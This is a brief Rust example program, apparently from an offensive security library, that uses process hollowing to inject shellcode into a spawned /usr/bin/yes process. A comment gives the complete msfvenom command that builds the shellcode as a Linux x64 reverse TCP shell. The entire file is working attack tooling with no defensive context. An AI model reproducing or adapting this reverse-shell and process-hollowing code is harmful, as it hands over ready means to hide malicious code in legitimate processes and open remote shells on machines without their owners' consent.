use std::env::current_dir;

use linc::payload::{Payload, PayloadResultExt, Spawn};
use linc::techniques::spawn::hollow;

fn main() {
    let path = current_dir().unwrap();
    let cwd = path.display();

    // Shellcode:
    // msfvenom --payload 'linux/x64/shell_reverse_tcp' LHOST=127.0.0.1 LPORT=1234 --format 'raw' --platform 'linux' --arch 'x64' --out shellcode.bin
    let shellcode = format!("{}/assets/shellcode.bin", cwd);

    let payload = Payload::<Spawn>::from_file(&shellcode)
        .set_target("/usr/bin/yes")
        .set_target_args("YES");

    let payload = match payload {
        Ok(p) => p,
        Err(e) => {
            eprintln!("Failed to create payload: {:?}", e);
            return;
        }
    };

    if let Err(e) = hollow(payload) {
        eprintln!("An error occurred: {:?}", e);
    }
}
